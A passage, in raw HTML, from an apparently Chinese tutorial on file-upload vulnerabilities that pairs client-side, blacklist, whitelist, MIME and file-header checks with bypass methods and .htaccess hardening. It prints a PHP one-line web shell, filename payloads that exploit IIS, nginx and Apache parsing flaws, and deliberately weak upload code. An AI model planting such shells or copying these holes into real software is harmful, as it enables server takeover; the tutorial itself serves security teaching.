string\">\".jpg|.png|.gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 提取上传文件的类型</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">var</span> ext_name <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 判断上传文件类型是否允许上传</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>allow_ext<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>ext_name <span class=\"token operator\">+</span> <span class=\"token string\">\"|\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">var</span> errMsg <span class=\"token operator\">=</span> <span class=\"token string\">\"该文件不允许上传，请上传\"</span> <span class=\"token operator\">+</span> allow_ext <span class=\"token operator\">+</span> <span class=\"token string\">\"类型的文件,当前文件类型为：\"</span> <span class=\"token operator\">+</span> ext_name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>errMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>在表单中使用 onsumbit=checkFile () 调用 js 函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p>\n<h3 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h3>\n<p>这种限制很简单，通过浏览器 F12 很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是 JS 脚本检测，在本地浏览器客户端禁用 JS 即可。可使用火狐浏览器的 NoScript 插件、IE 中禁用掉 JS 等方式实现绕过。</p>\n<h3 id=\"操作方法\"><a class=\"anchor\" href=\"#操作方法\">#</a> 操作方法</h3>\n<p>准备一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>并且修改后缀名为 jpg，上传操作，通过 burpsuit 抓包改包，使其后缀名修改回 php。</p>\n<h2 id=\"服务器检测扩展名\"><a class=\"anchor\" href=\"#服务器检测扩展名\">#</a> 服务器检测扩展名</h2>\n<p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br />\n在检查扩展名是否合法的时候，有两种策略：</p>\n<h3 id=\"黑名单策略\"><a class=\"anchor\" href=\"#黑名单策略\">#</a> 黑名单策略</h3>\n<p>文件扩展名在黑名单中的为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.asp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.aspx'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.jsp'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 收尾去空</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span>            </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                 <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"白名单策略\"><a class=\"anchor\" href=\"#白名单策略\">#</a> 白名单策略</h3>\n<p>文件扩展名不在白名单中的均为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_path'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理-2\"><a class=\"anchor\" href=\"#原理-2\">#</a> 原理</h3>\n<p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p>\n<h3 id=\"绕过方法-2\"><a class=\"anchor\" href=\"#绕过方法-2\">#</a> 绕过方法</h3>\n<p>在一些 Web server 中，存在解析漏洞:</p>\n<pre><code>1. 老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析\n\n2. 老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容\n来避免黑名单过滤，如 a.asp;jpg\n\n3. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使\n得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行\n\n4. nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行\n（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）\n\n5. apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析\n文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，\n从而达到了注入php代码的目的\n</code></pre>\n<h2 id=\"服务器检测mime\"><a class=\"anchor\" href=\"#服务器检测mime\">#</a> 服务器检测 MIME</h2>\n<p>原理 检查 Content-Type</p>\n<p>HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改。</p>\n<h3 id=\"常见类型\"><a class=\"anchor\" href=\"#常见类型\">#</a> 常见类型</h3>\n<table>\n    <tr>\n        <th>文件后缀</th>\n        <th>Mime类型</th>\n        <th>说明</th>\n    </tr>\n    <tr>\n        <td>.flv</td>\n        <td>flv/flv-flash</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.html或.htm</td>\n        <td>text/html</td>\n        <td>超文本标记语言文本</td>\n    </tr>\n    <tr>\n        <td>.rtf</td>\n        <td>application/rtf</td>\n        <td>RTF文本</td>\n    </tr>\n    <tr>\n        <td>.gif 或.png</td>\n        <td>image/gif(image/png)</td>\n        <td>GIF图形/PNG图片</td>\n    </tr>\n    <tr>\n        <td>.jpeg或.jpg</td>\n        <td>image/jpeg</td>\n        <td>JPEG图形</td>\n    </tr>\n    <tr>\n        <td>.au</td>\n        <td>audio/basic</td>\n        <td>au声音文件</td>\n    </tr>\n    <tr>\n        <td>.mid或.midi</td>\n        <td>audio/midi或audio/x-midi</td>\n        <td>MIDI音乐文件</td>\n    </tr>\n    <tr>\n        <td>.ra或.ram或.rm</td>\n        <td>audio/x-pn-realaudio</td>\n        <td>RealAudio音乐文件</td>\n    </tr>\n    <tr>\n        <td>.mpg或.mpeg或.mp3</td>\n        <td>video/mpeg</td>\n        <td>MPEG文件</td>\n    </tr>\n    <tr>\n        <td>.avi</td>\n        <td>video/x-msvideo</td>\n        <td>AVI文件</td>\n    </tr>\n    <tr>\n        <td>.gz</td>\n        <td>application/x-gzip</td>\n        <td>GZIP文件</td>\n    </tr>\n    <tr>\n        <td>.tar</td>\n        <td>application/x-tar</td>\n        <td>TAR文件</td>\n    </tr>\n    <tr>\n        <td>.exe</td>\n        <td>application/octet-stream</td>\n        <td>下载文件类型</td>\n    </tr>\n    <tr>\n        <td>.rmvb</td>\n        <td>video/vnd.rn-realvideo</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.txt</td>\n        <td>text/plain</td>\n        <td>普通文本</td>\n    </tr>\n    <tr>\n        <td>.mrp</td>\n        <td>application/octet-stream</td>\n        <td>MRP文件&#xff08;国内普遍的手机&#xff09;</td>\n    </tr>\n    <tr>\n        <td>.ipa</td>\n        <td>application/iphone-package-archive</td>\n        <td>IPA文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.deb</td>\n        <td>application/x-debian-package-archive</td>\n        <td>DED文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.apk</td>\n        <td>application/vnd.android.package-archive</td>\n        <td>APK文件(安卓系统)</td>\n    </tr>\n    <tr>\n        <td>.cab</td>\n        <td>application/vnd.cab-com-archive</td>\n        <td>CAB文件(Windows Mobile)</td>\n    </tr>\n    <tr>\n        <td>.xap</td>\n        <td>application/x-silverlight-app</td>\n        <td>XAP文件(Windows Phone 7)</td>\n    </tr>\n    <tr>\n        <td>.sis</td>\n        <td>application/vnd.symbian.install-archive</td>\n        <td>SIS文件(symbian平台)</td>\n    </tr>\n    <tr>\n        <td>.jar</td>\n        <td>application/java-archive</td>\n        <td>JAR文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.jad</td>\n        <td>text/vnd.sun.j2me.app-descriptor</td>\n        <td>JAD文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.sisx</td>\n        <td>application/vnd.symbian.epoc/x-sisx-app</td>\n        <td>SISX文件(symbian平台)</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-3\"><a class=\"anchor\" href=\"#绕过方法-3\">#</a> 绕过方法</h3>\n<p>使用各种各样的工具（如 burpsuite）强行篡改 Header 就可以，将 Content-Type: application/php 改为其他 web 程序允许的类型。</p>\n<h2 id=\"文件头检查文件\"><a class=\"anchor\" href=\"#文件头检查文件\">#</a> 文件头检查文件</h2>\n<p>原理:<br />\n 利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>\n<h3 id=\"常见格式\"><a class=\"anchor\" href=\"#常见格式\">#</a> 常见格式</h3>\n<table>\n    <tr>\n        <th align=\"left\">格式</th>\n        <th align=\"left\">文件头</th>\n    </tr>\n    <tr>\n        <td align=\"left\">TIFF (tif)</td>\n        <td align=\"left\">49492A00</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Windows Bitmap (bmp)</td>\n        <td align=\"left\">424D</td>\n    </tr>\n    <tr>\n        <td align=\"left\">CAD (dwg)</td>\n        <td align=\"left\">41433130</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Photoshop (psd)</td>\n        <td align=\"left\">38425053</td>\n    </tr>\n    <tr>\n        <td align=\"left\">JPEG (jpg)</td>\n        <td align=\"left\">FFD8FF</td>\n    </tr>\n    <tr>\n        <td align=\"left\">PNG (png)</td>\n        <td align=\"left\">89504E47</td>\n    </tr>\n    <tr>\n        <td align=\"left\">GIF (gif)</td>\n        <td align=\"left\">47494638</td>\n    </tr>\n    <tr>\n        <td align=\"left\">XML (xml)</td>\n        <td align=\"left\">3C3F786D6C</td>\n    </tr>\n    <tr>\n        <td align=\"left\">HTML (html)</td>\n        <td align=\"left\">68746D6C3E</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Word/Excel (xls.or.doc)</td>\n        <td align=\"left\">D0CF11E0</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Access (mdb)</td>\n        <td align=\"left\">5374616E64617264204A</td>\n    </tr>\n    <tr>\n        <td align=\"left\">ZIP Archive (zip)，</td>\n        <td align=\"left\">504B0304</td>\n    </tr>\n    <tr>\n        <td align=\"left\">RAR Archive (rar)，</td>\n        <td align=\"left\">52617221</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Wave (wav)，</td>\n        <td align=\"left\">57415645</td>\n    </tr>\n    <tr>\n        <td align=\"left\">AVI (avi)，</td>\n        <td align=\"left\">41564920</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Acrobat (pdf)，</td>\n        <td align=\"left\">255044462D312E</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-4\"><a class=\"anchor\" href=\"#绕过方法-4\">#</a> 绕过方法</h3>\n<p>给上传脚本加上相应的幻数头字节就可以，php 引擎会将 &lt;? 之前的内容当作 html 文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br />\n（一般不限制图片文件格式的时候使用 GIF 的头比较方便，因为全都是文本可打印字符。）</p>\n<h2 id=\"限制web-server对特定类型文件的行为htaccess文件攻击\"><a class=\"anchor\" href=\"#限制web-server对特定类型文件的行为htaccess文件攻击\">#</a> 限制 Web Server 对特定类型文件的行为 (.htaccess 文件攻击)</h2>\n<h3 id=\"原理-3\"><a class=\"anchor\" href=\"#原理-3\">#</a> 原理</h3>\n<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制 web server 对于特定文件夹的行为。</p>\n<p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以 Apache 为例：</p>\n<blockquote>\n<p>在默认情况下，对与 .php 文件 Apache 会当作代码来执行，对于 html,css,js 文件，则会直接由 HTTP Response 交给客户端程序对于一些资源文件，比如 txt，doc，rar 等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此 Apache 使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对 web server 行为进行限制。<br />\n禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p>\n</blockquote>\n<p>指定特定扩展名的文件的处理方式，原理是指定 Response 的 Content-Type 可以加上如下几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>AddType text/plain .pl .py .php</pre></td></tr></table></figure><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Options -ExecCGI</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</pre></td></tr></table></figure><p>在这种情况下，以上几种类型的文件被访问的时候，会返回 403 Forbidden 的错误</p>\n<p>强制 web 服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让 apache 将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"\\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ForceType text/plain</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>只允许访问特定类型的文件。使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问 (白名单策略)。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td 